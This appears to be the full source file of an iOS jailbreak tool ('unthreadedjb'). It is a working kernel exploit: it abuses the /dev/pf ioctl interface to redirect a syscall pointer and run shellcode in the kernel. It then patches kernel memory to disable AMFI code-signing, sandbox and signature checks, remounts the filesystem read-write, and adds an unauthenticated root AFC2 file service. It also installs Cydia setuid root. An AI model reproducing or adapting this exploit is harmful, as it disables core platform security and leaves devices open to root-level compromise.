#include <unistd.h>
#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <net/pfvar.h>
#include <sys/syscall.h>
#include <libkern/OSCacheControl.h>
#include <CoreGraphics/CoreGraphics.h>
#include <Foundation/Foundation.h>
#include <sys/stat.h>
#include <IOKit/IOKitLib.h>
#include <CoreSurface.h>
#include <IOMobileFramebuffer.h>
#include <ImageIO/ImageIO.h>
#include <assert.h>
#include <spawn.h>
#include <sys/sysctl.h>

mach_port_t kernel_task = 0; /* pid 0 */

#define KERNEL_PATCH_FINISH_UP 0

extern void* kernel_code_start;
extern void* kernel_code_end;

int drawImage(const char* pngFileName);

#include <our_tar.h>

#define _log
#define _assert(x) (x)
#define _assert_zero(x) (x)

kern_return_t
kr_write(mach_port_t p, void* addr, uint8_t *value, uint32_t size)
{
    kern_return_t ret;
    
    size -= 1;
    
    ret = vm_write(p, (vm_address_t)(addr), (vm_address_t)(value), size);
    if (ret) {
        return ret;
    }
    
    return ret;
}

/* Alternatively could parse mach header and get __PRELINK_INFO and do that */
uint8_t amfi_original[] = {0xD0, 0x47, 0x01, 0x21, 0x40, 0xB1, 0x13, 0x35};
uint8_t amfi_patched[] = {0x00, 0x20, 0x01, 0x21, 0x40, 0xB1, 0x13, 0x35};

uint8_t amfi_kill_original[] = {0x09, 0x21, 0xba, 0x4a, 0x28, 0x46, 0x90, 0x47, 0x19, 0xe1, 0x4f, 0xf0, 0xff, 0x32};
uint8_t amfi_kill_patched[] = {0x09, 0x21, 0xba, 0x4a, 0x28, 0x46, 0xc0, 0x46, 0x19, 0xe1, 0x4f, 0xf0, 0xff, 0x32};

uint8_t sandbox_original[] = {0x00, 0x78, 0x10, 0xf0, 0x04, 0x0f, 0x04, 0xd0};
uint8_t sandbox_patched[] = {0x00, 0x78, 0x01, 0x23, 0x01, 0x23, 0x04, 0xd0};

uint8_t csed_original[] = {0xdf, 0xf8, 0x88, 0x33, 0x1d, 0xee, 0x90, 0x0f, 0xa2, 0x6a, 0x1b, 0x68};
uint8_t csed_patched[] = {0xdf, 0xf8, 0x88, 0x33, 0x1d, 0xee, 0x90, 0x0f, 0xa2, 0x6a, 0x01, 0x23};

uint8_t pe_debug_original[] = {0x38, 0xB1, 0x05, 0x49, 0x09, 0x68, 0x00, 0x29};
uint8_t pe_debug_patched[] = {0x01, 0x20, 0x70, 0x47, 0x09, 0x68, 0x00, 0x29};

uint8_t sigcheck_original[] = {0xFF, 0x31, 0xA7, 0xF1, 0x18, 0x04, 0x08, 0x46, 0xA5, 0x46, 0xBD, 0xE8, 0x00, 0x0D, 0xF0, 0xBD};
uint8_t sigcheck_patched[]  = {0xFF, 0x31, 0xA7, 0xF1, 0x18, 0x04, 0x00, 0x20, 0xA5, 0x46, 0xBD, 0xE8, 0x00, 0x0D, 0xF0, 0xBD};

int patch_amfi_sandbox(void)
{
    kern_return_t ret;
    uint32_t i, sz;
    pointer_t buf;
    vm_address_t addr;
    
    ret = task_for_pid(mach_task_self(), 0, &kernel_task);
    
    if(ret) {
        printf("task_for_pid returned %x: missing task-for-pid kernel patch or wrong entitlements\n", ret);
        return -1;
    }
    
    printf("tfp looks good\n");
    
    addr = 0x80001000;
    
    while(addr < (0x80001000 + 0x800000))
    {
        vm_read(kernel_task, addr, 2048, &buf, &sz);
        if(!buf || sz == 0)
            continue;
        uint8_t* p = (uint8_t*) buf;
        
        for(i = 0; i < sz; i++)
        {
#define PATCH(x) \
if(!memcmp(p + i, x ##_original, sizeof(x ##_original))) \
{   \
kr_write(kernel_task, (void*)(addr+i), x ##_patched, sizeof(x ##_original)); \
continue; \
}
            PATCH(amfi);
            PATCH(amfi_kill);
            PATCH(sandbox);
            PATCH(sigcheck);
#undef PATCH
        }
        addr += 2048;
    }
    
    return 0;
}

char ***_NSGetEnviron(void);

// comex stuff
static int run(char **argv, char **envp) {
    if(envp == NULL) envp = *((char ***)_NSGetEnviron());
    fprintf(stderr, "run:");
    for(char **p = argv; *p; p++) {
        fprintf(stderr, " %s", *p);
    }
    fprintf(stderr, "\n");
    
    pid_t pid;
    int stat;
    if(posix_spawn(&pid, argv[0], NULL, NULL, argv, envp)) return 255;
    if(pid != waitpid(pid, &stat, 0)) return 254;
    if(!WIFEXITED(stat)) return 253;
    return WEXITSTATUS(stat);
}


// returns whether the plist existed
static bool modify_plist(NSString *filename, void (^func)(id)) {
    NSData *data = [NSData dataWithContentsOfFile:filename];
    if(!data) {
        return false;
    }
    NSPropertyListFormat format;
    NSError *error;
    id plist = [NSPropertyListSerialization propertyListWithData:data options:NSPropertyListMutableContainersAndLeaves format:&format error:&error];
    
    func(plist);
    
    NSData *new_data = [NSPropertyListSerialization dataWithPropertyList:plist format:format options:0 error:&error];
    
    [new_data writeToFile:filename atomically:YES];
    
    return true;
}

static void dok48() {
    char model[32];
    size_t model_size = sizeof(model);
    sysctlbyname("hw.model", model, &model_size, NULL, 0);
    
    NSString *filename = [NSString stringWithFormat:@"/System/Library/CoreServices/SpringBoard.app/%s.plist", model];
    modify_plist(filename, ^(id plist) {
        [[plist objectForKey:@"capabilities"] setObject:[NSNumber numberWithBool:false] forKey:@"hide-non-default-apps"];
    });
}

static void add_afc2() {
    _assert(modify_plist(@"/System/Library/Lockdown/Services.plist", ^(id services) {
        NSDictionary *args = [NSDictionary dictionaryWithObjectsAndKeys:
                              [NSArray arrayWithObjects:@"/usr/libexec/afcd",
                               @"--lockdown",
                               @"-d",
                               @"/",
                               nil], @"ProgramArguments",
                              [NSNumber numberWithBool:true], @"AllowUnauthenticatedServices",
                              @"com.apple.afc2",              @"Label",
                              nil];
        [services setValue:args forKey:@"com.apple.afc2"];
    }));
}

@interface LSApplicationWorkspace { }
+(LSApplicationWorkspace *)defaultWorkspace;
-(BOOL)registerApplication:(id)application;
-(BOOL)unregisterApplication:(id)application;
@end

static void uicache() {
    NSMutableDictionary *cache = [NSMutableDictionary dictionaryWithContentsOfFile:@"/var/mobile/Library/Caches/com.apple.mobile.installation.plist"];
    if(cache) {
        NSMutableDictionary *cydia = [NSMutableDictionary dictionaryWithContentsOfFile:@"/Applications/Cydia.app/Info.plist"];
        [cydia setObject:@"/Applications/Cydia.app" forKey:@"Path"];
        [cydia setObject:@"System" forKey:@"ApplicationType"];
        id system = [cache objectForKey:@"System"];
        if([system respondsToSelector:@selector(addObject:)])
            [system addObject:cydia];
        else
            [system setObject:cydia forKey:@"com.saurik.Cydia"];
        [cache writeToFile:@"/var/mobile/Library/Caches/com.apple.mobile.installation.plist" atomically:YES];
    }
    
    NSURL *url = [NSURL fileURLWithPath:@"/Applications/Cydia.app"];
    LSApplicationWorkspace *workspace = [LSApplicationWorkspace defaultWorkspace];
    [workspace unregisterApplication:url];
    [workspace registerApplication:url];
}

static void decrement_address(int pffd, struct pfioc_pooladdr* pp, uint32_t addr, int times)
{
    pp->addr.addr.p.tbl = (void *) (addr - 0x4A4);
    
    for(int i = 0; i < times; ++i)
    {
        ioctl(pffd, DIOCADDADDR, pp);
    }
}

int main(int argc, char* argv[])
{
    // This code is planetbeing's.
    // Offline calculations
    uintptr_t userland_start = 0x1F000000;
    int shift_byte = (KERNEL_SYSCALL0_VALUE >> 24) - (userland_start >> 24);
    uintptr_t shift_address = shift_byte << 24;
    vm_address_t target = (KERNEL_SYSCALL0_VALUE - shift_address) & ~0xFFF;
    int page_offset = (KERNEL_SYSCALL0_VALUE & 0xFFF) & ~1;
    int kernel_code_size = (uintptr_t)&kernel_code_end - (uintptr_t)&kernel_code_start;
    int kernel_code_size_page = (page_offset + kernel_code_size + 0xFFF)  / 0x1000 * 0x1000;
    
    // Setup kernel exploit structs
    struct pfioc_trans trans;
    struct pfioc_trans_e trans_e;
    struct pfioc_pooladdr pp;
    
    memset(&trans, 0, sizeof(trans));
    memset(&trans_e, 0, sizeof(trans_e));
    trans.size = 1;
    trans.esize = sizeof(trans_e);
    trans.array = &trans_e;
    trans_e.rs_num = PF_RULESET_FILTER;
    
    // Exploit kernel
    int pffd = open("/dev/pf", O_RDWR);
    ioctl(pffd, DIOCSTOP);
    ioctl(pffd, DIOCSTART);
    ioctl(pffd, DIOCXBEGIN, &trans);
    ioctl(pffd, DIOCBEGINADDRS, &pp);
    
    pp.af = AF_INET;
    pp.addr.addr.type = PF_ADDR_TABLE;
    
    // Disable XN bit for subsequent vm_allocates.
    decrement_address(pffd, &pp, KERNEL_NX_ENABLE - 1, 1);
    
    // Shift function pointer for syscall0 down into the userland
    decrement_address(pffd, &pp, KERNEL_SYSCALL0 + 3, shift_byte);
    
    ioctl(pffd, DIOCBEGINADDRS, &pp);
    ioctl(pffd, DIOCSTOP);
    close(pffd);
    
    // Allocate shellcode
    vm_address_t allocation = target;
    kern_return_t kr = vm_allocate(mach_task_self(), &allocation, kernel_code_size_page, FALSE);
    if(kr != KERN_SUCCESS)
        return 0;
    
    // Copy shellcode
    memcpy((void*)(allocation + page_offset), &kernel_code_start, kernel_code_size);
    sys_cache_control(kCacheFunctionPrepareForExecution, (void*)allocation, kernel_code_size_page);
    
    // Execute shellcode
    syscall(0, 0, 0);
    
    // end planetbeing's code.
    
    printf("done patching kernel\n");
    
    patch_amfi_sandbox();
    
    struct stat buf;
    
    if(stat("/private/var/unthreadedjb/install", &buf) != -1) {
        return 0;
    }
    
    drawImage("/private/var/unthreadedjb/unthread.png");
    
    NSString *string = [NSString stringWithContentsOfFile:@"/etc/fstab" encoding:NSUTF8StringEncoding error:NULL];
    string = [string stringByReplacingOccurrencesOfString:@",nosuid,nodev" withString:@""];
    string = [string stringByReplacingOccurrencesOfString:@" ro " withString:@" rw "];
    [string writeToFile:@"/etc/fstab" atomically:YES encoding:NSUTF8StringEncoding error:NULL];
    
    dok48();
    add_afc2();
    
    untar("/var/unthreadedjb/Cydia.tar", "/");
    
    chown("/Applications/Cydia.app/MobileCydia", 0, 0);
    chmod("/Applications/Cydia.app/MobileCydia", 06755);
    
    uicache();
    
    FILE *f = fopen("/private/var/unthreadedjb/install", "wb");
    char buf2[] = "lol";
    fwrite(buf2, 4, 1, f);
    fclose(f);
    
    sleep(4);
    run((char *[]) {"/sbin/reboot", NULL}, NULL);
    
    return 0;
}


int screenWidth, screenHeight;
CGContextRef context = NULL;

CGContextRef fb_open() {
    io_connect_t conn;
    int bytesPerRow;
    void *surfaceBuffer;
    void *frameBuffer;
    CGColorSpaceRef colorSpace;
    
    if (context != NULL)
        return context;
    
    io_service_t fb_service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleCLCD"));
    if (!fb_service) {
        fb_service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleM2CLCD"));
        if (!fb_service) {
            printf("Couldn't find framebuffer.\n");
            return NULL;
        }
    }
    
    IOMobileFramebufferOpen(fb_service, mach_task_self(), 0, &conn);
    IOMobileFramebufferGetLayerDefaultSurface(conn, 0, &surfaceBuffer);
    
    screenHeight = CoreSurfaceBufferGetHeight(surfaceBuffer);
    screenWidth = CoreSurfaceBufferGetWidth(surfaceBuffer);
    bytesPerRow = CoreSurfaceBufferGetBytesPerRow(surfaceBuffer);
    
    CoreSurfaceBufferLock(surfaceBuffer, 3);
    frameBuffer = CoreSurfaceBufferGetBaseAddress(surfaceBuffer);
    CoreSurfaceBufferUnlock(surfaceBuffer);
    
    // create bitmap context
    colorSpace = CGColorSpaceCreateDeviceRGB();
    context = CGBitmapContextCreate(frameBuffer, screenWidth, screenHeight, 8, bytesPerRow, colorSpace, kCGImageAlphaPremultipliedLast);
    if(context == NULL) {
        printf("Couldn't create screen context!\n");
        return NULL;
    }
    
    CGColorSpaceRelease(colorSpace);
    
    return context;
}

int drawImage(const char* pngFileName)
{
    CGContextRef c = fb_open();
    if (c == NULL)
        return -1;
    
    CFURLRef url = CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault, (const UInt8*)pngFileName, strlen(pngFileName), 0);
    void* imageSource = CGImageSourceCreateWithURL(url, NULL);
    CFRelease(url);
    
    if (imageSource != NULL)
    {
        CGImageRef img = CGImageSourceCreateImageAtIndex(imageSource, 0, NULL);
        if (img != NULL)
        {
            CGContextClearRect (c, CGRectMake(0, 0, screenWidth, screenHeight));
            CGContextDrawImage(c, CGRectMake(0, 0, screenWidth, screenHeight), img);
        }
    }
    return 0;
}
